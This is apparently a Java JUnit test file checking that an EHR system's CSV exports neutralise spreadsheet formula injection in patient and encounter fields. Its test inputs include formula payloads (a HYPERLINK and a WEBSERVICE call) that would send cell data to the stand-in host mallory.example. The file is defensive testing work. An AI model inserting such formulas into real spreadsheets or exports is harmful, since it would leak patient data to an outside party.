package com.medchart.ehr.legacy;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.api.io.TempDir;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import javax.persistence.EntityManager;
import javax.persistence.Query;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDate;
import java.util.Collections;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class CsvExportFormulaInjectionTest {

    private static final String HYPERLINK = "=HYPERLINK(\"https://mallory.example/?d=\"&B2&C2,\"open\")";

    @Mock
    private EntityManager entityManager;

    @Mock
    private Query query;

    @InjectMocks
    private EncounterExportService encounterExportService;

    @InjectMocks
    private ReportGenerator reportGenerator;

    @Test
    void encounterExportNeutralisesFormulasAndKeepsCommasInOneColumn() {
        Object[] row = {7L, "@ENC-1", "OUTPATIENT", "COMPLETED", "2026-10-01 09:00:00",
                "MRN0001", HYPERLINK, "Smith, Jr", "1980-01-01"};
        stubResults(Collections.singletonList(row));

        String csv = new String(encounterExportService.exportEncountersForDateRange(
                LocalDate.of(2026, 10, 1), LocalDate.of(2026, 10, 2)), StandardCharsets.UTF_8);

        String[] lines = csv.split("\n");
        assertEquals("EncounterId,EncounterNumber,PatientMRN,PatientName,DOB,EncounterDate,Type,Status", lines[0]);
        assertEquals("\"7\",\"'@ENC-1\",\"MRN0001\",\"'=HYPERLINK(\"\"https://mallory.example/?d=\"\"&B2&C2,\"\"open\"\") Smith, Jr\","
                + "\"1980-01-01\",\"2026-10-01 09:00:00\",\"OUTPATIENT\",\"COMPLETED\"", lines[1]);

        List<List<String>> parsed = CsvTestSupport.parse(csv);
        assertEquals(8, parsed.get(1).size());
        assertEquals("'" + HYPERLINK + " Smith, Jr", parsed.get(1).get(3));
    }

    @Test
    void encounterExportEmitsPatientNamedOnePlusOneAsText() {
        Object[] row = {1L, "ENC-1", "INPATIENT", "OPEN", "2026-10-01 09:00:00",
                "MRN0002", "=1+1", "Doe", "1990-02-02"};
        stubResults(Collections.singletonList(row));

        List<List<String>> parsed = CsvTestSupport.parse(new String(encounterExportService
                .exportEncountersForDateRange(LocalDate.of(2026, 10, 1), LocalDate.of(2026, 10, 1)),
                StandardCharsets.UTF_8));

        assertEquals("'=1+1 Doe", parsed.get(1).get(3));
    }

    @Test
    void allPatientsFileExportEncodesEveryField(@TempDir Path dir) throws Exception {
        Object[] row = {3L, "MRN0003", "=1+1", "Lee, Ann", "1970-03-03", "+1@x.example",
                "-555", null, "1 Main St", "Springfield", "IL", "62701"};
        stubResults(Collections.singletonList(row));
        Path out = dir.resolve("patients.csv");

        encounterExportService.exportAllPatientsToFile(out.toString());

        List<List<String>> parsed = CsvTestSupport.parse(new String(Files.readAllBytes(out), StandardCharsets.UTF_8));
        List<String> cells = parsed.get(1);
        assertEquals(12, cells.size());
        assertEquals("'=1+1", cells.get(2));
        assertEquals("Lee, Ann", cells.get(3));
        assertEquals("'+1@x.example", cells.get(5));
        assertEquals("'-555", cells.get(6));
        assertEquals("", cells.get(7));
    }

    @Test
    void patientRosterEncodesEveryField() throws Exception {
        Object[] row = {4L, "MRN0004", "000-00-0000", "@cmd", "Ng, Kim", "1985-04-04", "555-0100", null,
                "=WEBSERVICE(\"https://mallory.example\")", "2 Oak Ave", "Columbus", "OH", "43004", "Acme", "M-1"};
        stubResults(Collections.singletonList(row));

        Path roster = Path.of(reportGenerator.generatePatientRoster());
        try {
            List<List<String>> parsed = CsvTestSupport.parse(new String(Files.readAllBytes(roster), StandardCharsets.UTF_8));
            List<String> cells = parsed.get(1);
            assertEquals(15, cells.size());
            assertEquals("'@cmd", cells.get(3));
            assertEquals("Ng, Kim", cells.get(4));
            assertEquals("", cells.get(7));
            assertEquals("'=WEBSERVICE(\"https://mallory.example\")", cells.get(8));
        } finally {
            Files.deleteIfExists(roster);
        }
    }

    private void stubResults(List<Object[]> rows) {
        when(entityManager.createNativeQuery(anyString())).thenReturn(query);
        when(query.getResultList()).thenReturn(rows);
    }
}
